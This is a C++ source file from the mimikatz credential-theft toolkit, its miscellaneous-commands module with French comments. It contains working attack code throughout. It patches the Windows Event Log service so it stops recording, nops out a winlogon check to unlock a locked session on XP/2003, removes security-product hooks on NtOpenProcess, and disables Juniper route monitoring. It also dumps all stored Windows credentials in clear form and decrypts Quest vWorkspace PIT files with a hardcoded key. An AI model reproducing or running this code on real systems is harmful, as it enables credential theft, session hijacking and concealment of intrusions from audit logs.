/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
*/
#include "mod_mimikatz_divers.h"

vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_divers::getMimiKatzCommands()
{
	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(noroutemon,	L"noroutemon",	L"[experimental] Patch Juniper Network Connect pour ne plus superviser la table de routage"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(eventdrop,	L"eventdrop",	L"[super experimental] Patch l\'observateur d\'événements pour ne plus rien enregistrer"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(cancelator,	L"cancelator",	L"Patch le bouton annuler de Windows XP et 2003 en console pour déverrouiller une session"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(secrets,		L"secrets",		L"Affiche les secrets utilisateur"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(nodetour,	L":nodetour",	L"Anti-détours SR"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(pitme,		L":pitme",		L"Déchiffre les fichiers PIT (Quest vWorkspace Client)"));
	return monVector;
}

bool mod_mimikatz_divers::nodetour(vector<wstring> * arguments)
{
	vector<mod_patch::OS> mesOS;
	mesOS.push_back(mod_patch::WINDOWS_2003_____x64);
	mesOS.push_back(mod_patch::WINDOWS_VISTA____x64);
	mesOS.push_back(mod_patch::WINDOWS_2008_____x64);
	mesOS.push_back(mod_patch::WINDOWS_SEVEN____x64);
	mesOS.push_back(mod_patch::WINDOWS_2008r2___x64);
	
	if(mod_patch::checkVersion(&mesOS))
	{
		BYTE monSysEnterRetn[]	= {0x0f, 0x05, 0xc3};
		BYTE monDetouredStub[]	= {0x90, 0x90, 0xe9};
		
		PBYTE monNTDLLptr = reinterpret_cast<PBYTE>(GetProcAddress(GetModuleHandle(L"ntdll"), "NtOpenProcess"));
		if(memcmp(monNTDLLptr + 8, monDetouredStub, sizeof(monDetouredStub)) == 0)
		{
			wcout << L"Détour trouvé et ";
			if(mod_memory::writeMemory(monNTDLLptr + 8 + sizeof(monDetouredStub) + sizeof(LONG) + *reinterpret_cast<PLONG>(monNTDLLptr + 8 + sizeof(monDetouredStub)), monSysEnterRetn, sizeof(monSysEnterRetn)))
				wcout << L"patché :)";
			else
				wcout << L"NON patché :(";
			wcout << endl;
		}
		else
			wcout << L"Détour non trouvé" << endl;
	}
	return true;
}


bool mod_mimikatz_divers::cancelator(vector<wstring> * arguments)
{
	vector<mod_patch::OS> mesOS;
	mesOS.push_back(mod_patch::WINDOWS_XP_PRO___x86);
	mesOS.push_back(mod_patch::WINDOWS_2003_____x86);

	if(mod_patch::checkVersion(&mesOS))
	{
		BYTE patternCMPJMP[] = {0xff, 0xff, 0xff, 0x83, 0xff, 0x02, 0x0f, 0x84};
		BYTE patternNOP[] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
		long offsetCibleNOP	= 3;
	
		vector<mod_process::KIWI_PROCESSENTRY32> * mesProcesses = new vector<mod_process::KIWI_PROCESSENTRY32>();
		wstring processName = L"winlogon.exe";

		if(mod_process::getList(mesProcesses, &processName))
		{
			for(vector<mod_process::KIWI_PROCESSENTRY32>::iterator leProcess = mesProcesses->begin(); leProcess != mesProcesses->end(); leProcess++)
			{
				mod_patch::patchModuleOfPID(leProcess->th32ProcessID, L"", patternCMPJMP, sizeof(patternCMPJMP), patternNOP, sizeof(patternNOP), offsetCibleNOP);
			}
		}

		delete mesProcesses;
	}
	return true;
}


bool mod_mimikatz_divers::noroutemon(vector<wstring> * arguments)
{
	//BYTE patternTestRouteMon[]		= {0x83, 0xec, 0x1c, 0x55, 0x8b, 0xe9}; // 7.0 // 83 ec 1c 55 8b e9
	BYTE patternTestRouteMon[]		= {0x83, 0xec, 0x14, 0x53, 0x8b, 0xd9}; // 7.1 // 83 ec 14 53 8b d9
	BYTE patternNoTestRouteMon[]	= {0xb0, 0x01, 0xc2, 0x04, 0x00};
	
	mod_patch::patchModuleOfService(L"dsNcService", L"", patternTestRouteMon, sizeof(patternTestRouteMon), patternNoTestRouteMon, sizeof(patternNoTestRouteMon));
	return true;
}

bool mod_mimikatz_divers::eventdrop(vector<wstring> * arguments)
{
#ifdef _M_X64
	/* Windows NT 5 (XP / 2003) x64
	PerformWriteRequest(x)
	{
	.text:000007FF7C1919C0                 mov     r11, rsp						<= vrai départ de la fonction
	.text:000007FF7C1919C3                 sub     rsp, 178h
	=>	.text:000007FF7C1919CA                 mov     [r11+10h], rbx	49 89 5b 10
	.text:000007FF7C1919CE                 mov     [r11+18h], rsi	49 89 73 18
	<=>
	.text:000007FF7C1919C0                 xor     r13d, r13d		45 33 ed	<= vrai départ de la fonction
	.text:000007FF7C1919C3                 retn						c3			<= puis fin
	} */
	BYTE patternCommeCa5[]		= {0x49, 0x89, 0x5b, 0x10, 0x49, 0x89, 0x73, 0x18};	// 49 89 5b 10 49 89 73 18
	BYTE patternPasCommeCa5[]	= {0x45, 0x33, 0xed, 0xc3};
	long offsetCibleCommeCa5	= -10;

	/* Windows NT 6.0 (Vista / 2008) x64
	private: void Channel::ActualProcessEvent(class BinXmlReader &)
	{
	.text:000007FF79ED8904                 mov     [rsp+arg_0], rbx											<= vrai départ de la fonction
	.text:000007FF79ED8909                 push    rdi
	.text:000007FF79ED890A                 sub     rsp, 20h
	=>	.text:000007FF79ED890E                 mov     rdi, rcx									48 8b f9
	.text:000007FF79ED8911                 mov     rcx, rdx									48 8b ca
	.text:000007FF79ED8914                 mov     rbx, rdx									48 8b da
	.text:000007FF79ED8917                 call    ?Reset@BinXmlReader@@QEAAXXZ				e8 xx xx xx xx
	<=>
	.text:000007FF79ED8904                 retn												c3				<= vrai départ de la fonction (et fin)
	}
	*/
	BYTE patternCommeCa60[]		= {0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0x48, 0x8b, 0xda, 0xe8};	// 48 8b f9 48 8b ca 48 8b da e8
	BYTE patternPasCommeCa60[]	= {0xc3};
	long offsetCibleCommeCa60	= -10;

	/* Windows NT 6.1 (Seven / 2008r2) x64
	private: void Channel::ActualProcessEvent(class BinXmlReader &)
	{
	.text:000007FF7C401B9C                 push    rdi														<= vrai départ de la fonction
	.text:000007FF7C401B9E                 sub     rsp, 50h
	.text:000007FF7C401BA2                 mov     [rsp+58h+var_38], 0FFFFFFFFFFFFFFFEh
	.text:000007FF7C401BAB                 mov     [rsp+58h+arg_0], rbx
	=>	.text:000007FF7C401BB0                 mov     rbx, rdx									48 8b da
	.text:000007FF7C401BB3                 mov     rdi, rcx									48 8b f9
	.text:000007FF7C401BB6                 mov     rcx, rdx									48 8b ca
	.text:000007FF7C401BB9                 call    ?Reset@BinXmlReader@@QEAAXXZ				e8 xx xx xx xx
	<=>
	.text:000007FF7C401B9C                 retn												c3				<= vrai départ de la fonction (et fin)
	} */
	BYTE patternCommeCa61[]		= {0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0xe8};	// 48 8b da 48 8b f9 48 8b ca e8
	BYTE patternPasCommeCa61[]	= {0xc3};
	long offsetCibleCommeCa61	= -20; // risqué :( a tester !!! //
#elif defined _M_IX86
	/* Windows NT 5 (XP / 2003) x86
	__stdcall PerformWriteRequest(x)
	{
	.text:77B827F9                 push    0D4h									<= vrai départ de la fonction
	.text:77B827FE                 push    offset stru_xxxxxxxx
	.text:77B82803                 call    __SEH_prolog
	.text:77B82808                 mov     eax, ___security_cookie
	=>	.text:77B8280D                 mov     [ebp+var_1C], eax		89 45 e4
	.text:77B82810                 mov     edi, [ebp+arg_0]			8b 7d 08
	.text:77B82813                 mov     [ebp+var_50], edi		89 7d (b0/b4)
	<=>
	.text:77B827F9                 xor     eax, eax					33 c0		<= vrai départ de la fonction
	.text:77B827FB                 retn    4						c2 04 00	<= puis fin
	} */
	BYTE patternCommeCa5[]		= {0x89, 0x45, 0xe4, 0x8b, 0x7d, 0x08, 0x89, 0x7d};	// 89 45 e4 8b 7d 08 89 7d
	BYTE patternPasCommeCa5[]	= {0x33, 0xc0, 0xc2, 0x04, 0x00};
	long offsetCibleCommeCa5	= -20; // risqué :(

	/* Windows NT 6.0 (Vista / 2008) x86
	private: void __thiscall Channel::ActualProcessEvent(class BinXmlReader &)
	{
	.text:71505B19                 mov     edi, edi													<= vrai départ de la fonction
	.text:71505B1B                 push    ebp
	=>	.text:71505B1C                 mov     ebp, esp									8b ec
	.text:71505B1E                 push    esi										56
	.text:71505B1F                 mov     esi, ecx									8b f1
	.text:71505B21                 mov     ecx, [ebp+arg_0]							8b 4d 08
	.text:71505B24                 call    ?Reset@BinXmlReader@@QAEXXZ				e8 xx xx xx xx
	<=>
	.text:71505B19                 retn												c3				<= vrai départ de la fonction (et fin)
	} */
	BYTE patternCommeCa60[]		= {0x8b, 0xec, 0x56, 0x8b, 0xf1, 0x8b, 0x4d, 0x08, 0xe8};	// 8b ec 56 8b f1 8b 4d 08 e8
	BYTE patternPasCommeCa60[]	= {0xc2, 0x04, 0x00};
	long offsetCibleCommeCa60	= -3;

	/* Windows NT 6.1 (Seven) x86
	private: void __thiscall Channel::ActualProcessEvent(class BinXmlReader &)
	{
	.text:715D2811                 push    10h														<= vrai départ de la fonction
	.text:715D2813                 mov     eax, offset loc_716AC264
	.text:715D2818                 call    sub_715D1774
	.text:715D281D                 mov     esi, ecx
	.text:715D281F                 mov     ecx, [ebp+8]
	.text:715D2822                 call    ?Reset@BinXmlReader@@QAEXXZ
	.text:715D2827                 xor     ecx, ecx
	=>	.text:715D2829                 cmp     [esi+0C0h], cl							xx xx xx xx 00 00
	.text:715D282F                 jz      short loc_715D283D						74 0c
	.text:715D2831                 cmp     [esi+0DCh], ecx							39 xx xx xx xx xx
	<=>
	.text:715D2811                 retn												c3				<= vrai départ de la fonction (et fin)
	} */
	BYTE patternCommeCa61[]		= {0x00, 0x00, 0x74, 0x0c, 0x39};	// 00 00 74 0c 39
	BYTE patternPasCommeCa61[]	= {0xc2, 0x04, 0x00};
	long offsetCibleCommeCa61	= -24; // risqué++ :(:(
#endif

	BYTE * patternCommeCa = NULL; DWORD szPatternCommeCa = 0;
	BYTE * patternPasCommeCa = NULL; DWORD szPatternPasCommeCa = 0;
	long offsetPatternPasCommeCa = 0;

	wstring libEvent;

	if(mod_system::GLOB_Version.dwMajorVersion == 5)
	{
		libEvent.assign(L"eventlog.dll");
		patternCommeCa = patternCommeCa5; szPatternCommeCa = sizeof(patternCommeCa5); 
		patternPasCommeCa = patternPasCommeCa5; szPatternPasCommeCa = sizeof(patternPasCommeCa5);
		offsetPatternPasCommeCa = offsetCibleCommeCa5;
	}
	else if(mod_system::GLOB_Version.dwMajorVersion == 6)
	{
		libEvent.assign(L"wevtsvc.dll");
		if(mod_system::GLOB_Version.dwMinorVersion == 0)
		{
			patternCommeCa = patternCommeCa60; szPatternCommeCa = sizeof(patternCommeCa60);
			patternPasCommeCa = patternPasCommeCa60; szPatternPasCommeCa = sizeof(patternPasCommeCa60);
			offsetPatternPasCommeCa = offsetCibleCommeCa60;
		}
		else if(mod_system::GLOB_Version.dwMinorVersion == 1)
		{
			patternCommeCa = patternCommeCa61; szPatternCommeCa = sizeof(patternCommeCa61);
			patternPasCommeCa = patternPasCommeCa61; szPatternPasCommeCa = sizeof(patternPasCommeCa61);
			offsetPatternPasCommeCa = offsetCibleCommeCa61;
		}
	}

	if(patternCommeCa && patternPasCommeCa)
	{
		mod_patch::patchModuleOfService(L"EventLog", libEvent, patternCommeCa, szPatternCommeCa, patternPasCommeCa, szPatternPasCommeCa, offsetPatternPasCommeCa);
	}
	else wcout << L"Impossible de choisir les patterns pour la version " << mod_system::GLOB_Version.dwMajorVersion << L'.' << mod_system::GLOB_Version.dwMinorVersion << endl;

	return true;
}

bool mod_mimikatz_divers::secrets(vector<wstring> * arguments)
{
	DWORD credNb = 0;
	PCREDENTIAL * pCredential = NULL;
	DWORD flags = (arguments->empty() ? 0 : CRED_ENUMERATE_ALL_CREDENTIALS);

	if(CredEnumerate(NULL, flags, &credNb, &pCredential))
	{
		wcout << L"Nombre de secrets : " << credNb << endl;
		
		for(DWORD i = 0; i < credNb; i++)
		{
			wstring type;
			bool isCertificate = false;
			switch(pCredential[i]->Type)
			{
				case CRED_TYPE_GENERIC:
					type.assign(L"GENERIC");
					break;
				case CRED_TYPE_DOMAIN_PASSWORD:
					type.assign(L"DOMAIN_PASSWORD");
					break;
				case CRED_TYPE_DOMAIN_CERTIFICATE:
					type.assign(L"DOMAIN_CERTIFICATE");
					isCertificate = true;
					break;
				case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD:
					type.assign(L"DOMAIN_VISIBLE_PASSWORD");
					break;
				case CRED_TYPE_GENERIC_CERTIFICATE:
					type.assign(L"GENERIC_CERTIFICAT");
					isCertificate = true;
					break;
				case CRED_TYPE_DOMAIN_EXTENDED:
					type.assign(L"DOMAIN_EXTENDED");
					break;
				default:
					type.assign(L"?");
			}

			wcout << 
				L"TargetName         : " << pCredential[i]->TargetName << L" / " << (pCredential[i]->TargetAlias ? pCredential[i]->TargetAlias : L"<NULL>") << endl <<
				L"Type               : " << type << L" (" << pCredential[i]->Type << L')' << endl <<
				L"Comment            : " << (pCredential[i]->Comment ? pCredential[i]->Comment : L"<NULL>") << endl <<
				L"UserName           : " << pCredential[i]->UserName << endl << 
				L"Credential         : " << mod_text::stringOrHex(pCredential[i]->CredentialBlob, pCredential[i]->CredentialBlobSize) << endl <<
				endl;
		}
		CredFree(pCredential);
	}
	else wcout << L"CredEnumerate : " << mod_system::getWinError() << endl;
	
	return true;
}


bool mod_mimikatz_divers::pitme(vector<wstring> * arguments)
{
	static const BYTE HARDCODED_KEY[]	= {
		0x80, 0x5B, 0xE8, 0x18, 0x6F, 0x64, 0x89, 0x3A, 0x34, 0xCE, 0x59, 0xDF, 0x4D, 0xB4, 0x5A, 0x0F,
		0x69, 0x94, 0x58, 0x70, 0x71, 0x4B, 0x17, 0xCF, 0xC3, 0x40, 0xAA, 0xFC, 0xC5, 0xE0, 0x21, 0xDB,
		0x9A, 0x49, 0x68, 0xB8, 0x2F, 0x4A, 0x6C, 0xDC, 0x7A, 0x8B, 0x7F, 0x5C, 0x03, 0x08, 0xFE, 0x39,
		0xA3, 0xC6, 0x31, 0xA6, 0x8C, 0xBD, 0x72, 0xA4, 0x8A, 0x1B, 0x92, 0xD5, 0x87, 0xAD, 0x78, 0x8F,
		0x55, 0x96, 0x0B, 0x30, 0xA8, 0x43, 0x53, 0xB0, 0x62, 0xA0, 0xDA, 0x7C, 0x13, 0x8D, 0x5D, 0x81,
		0xC0, 0x8E, 0x90, 0x88, 0xE4, 0xB7, 0x76, 0xC2, 0xB5, 0x04, 0x93, 0xA5, 0xA9, 0x9E, 0xAB, 0xF5,
		0x37, 0xAC, 0x99, 0x26, 0xE2, 0x38, 0x85, 0xE1, 0x74, 0x77, 0x32, 0xE5, 0x91, 0x23, 0xB1, 0x10,
		0x4C, 0x47, 0x3F, 0xBE, 0x82, 0x22, 0x6A, 0x51, 0xD0, 0x63, 0x75, 0x11, 0x33, 0x9B, 0xFB, 0x3B,
		0xCA, 0xED, 0xDD, 0x44, 0xE6, 0x12, 0x4E, 0x97, 0x3C, 0x79, 0x4F, 0x41, 0x66, 0xBA, 0x50, 0x0E,
		0xC9, 0x6B, 0x05, 0xEE, 0x6E, 0xE7, 0x95, 0x7B, 0x60, 0x9D, 0xFF, 0xC4, 0x29, 0x86, 0xB9, 0x7D,
		0x98, 0xC8, 0x9C, 0x35, 0xBB, 0xBC, 0xEF, 0xFA, 0x3D, 0x06, 0xF9, 0x36, 0xBF, 0x3E, 0x7E, 0xA2,
		0xC7, 0x56, 0xAE, 0xCB, 0xAF, 0xE9, 0x42, 0x61, 0xF0, 0x1D, 0xFD, 0x65, 0x9F, 0x52, 0x27, 0xEA,
		0x24, 0xA1, 0xA7, 0xB2, 0x6D, 0x14, 0xB3, 0x45, 0xF8, 0xB6, 0xF7, 0x73, 0xC1, 0x83, 0x84, 0xF4,
		0xCC, 0xCD, 0xF3, 0xE3, 0x54, 0x15, 0xD1, 0x46, 0x07, 0x57, 0x2C, 0xD2, 0xD3, 0xD6, 0xD4, 0xD7,
		0xF6, 0xEB, 0xD8, 0x1C, 0x00, 0x09, 0xEC, 0x67, 0x0A, 0xD9, 0x16, 0xDE, 0xF1, 0xF2, 0x01, 0x2D,
		0x5E, 0x48, 0x02, 0x0C, 0x5F, 0x0D, 0x19, 0x1A, 0x28, 0x1E, 0x1F, 0x20, 0x25, 0x2A, 0x2B, 0x2E
	};
	static const DWORD SUBKEY_SIZE	= 16;
	static const BYTE HEADER_PIT[]	= {'P', 'I', 'T'};

	FILE * monFichierSource, * monFichierDestination;
	BYTE * monBuffer, * monBufferData;
	ULONG tailleFichierSource, tailleData;

	if(arguments->size() < 1)
	{
		wcout << L"divers:::pitme file.pit [file.rdp]" << endl;
	}
	else
	{
		wcout << L" * Ouverture en lecture du fichier \'" << arguments->front() << L"\' : ";
		if(monFichierSource = _wfopen(arguments->front().c_str(), L"rb"))
		{
			fseek(monFichierSource, 0, SEEK_END);
			tailleFichierSource = ftell(monFichierSource);
			monBuffer = new BYTE[tailleFichierSource];
			fseek(monFichierSource, 0, SEEK_SET);
			fread(monBuffer, tailleFichierSource, 1, monFichierSource);
			fclose(monFichierSource);

			wcout << L"OK" << endl << L" * Déchiffrement n°1 : ";
			if(mod_crypto::genericDecrypt(monBuffer, tailleFichierSource, HARDCODED_KEY, sizeof(HARDCODED_KEY), CALG_RC4))
			{
				wcout << L"OK" << endl << L" * Déchiffrement n°2 : ";
				if(mod_crypto::genericDecrypt(monBuffer, tailleFichierSource - SUBKEY_SIZE, monBuffer + tailleFichierSource - SUBKEY_SIZE, SUBKEY_SIZE, CALG_RC4))
				{
					wcout << L"OK" << endl << L" * En-tête : ";
					if(memcmp(monBuffer, HEADER_PIT, sizeof(HEADER_PIT)) == 0)
					{
						wcout << L"OK" << endl;
						monBufferData = monBuffer + sizeof(HEADER_PIT);
						tailleData = tailleFichierSource - sizeof(HEADER_PIT) - SUBKEY_SIZE;

						if(arguments->size() > 1)
						{
							wcout << L" * Ouverture en écriture du fichier \'" << arguments->back() << L"\' : ";
							if(monFichierDestination = _wfopen(arguments->back().c_str(), L"wb"))
							{
								wcout << L"OK" << endl;
								fwrite(monBufferData, tailleData, 1, monFichierDestination);
								fclose(monFichierDestination);
							}
							else wcout << L"KO" << endl;
						}
						else wcout << L" * Données : " << endl << endl <<wstring(reinterpret_cast<char *>(monBufferData), reinterpret_cast<char *>(monBufferData + tailleData)) << endl;
					}
					else wcout << L"KO - différent de \'PIT\' ; " << mod_text::stringOfHex(HEADER_PIT, sizeof(HEADER_PIT)) << L" != " << mod_text::stringOfHex(monBuffer, sizeof(HEADER_PIT)) << endl;
				}
				else wcout << L"KO";
			}
			else wcout << L"KO";
			delete(monBuffer);
		}
		else wcout << L"KO" << endl;
	}
	return true;
}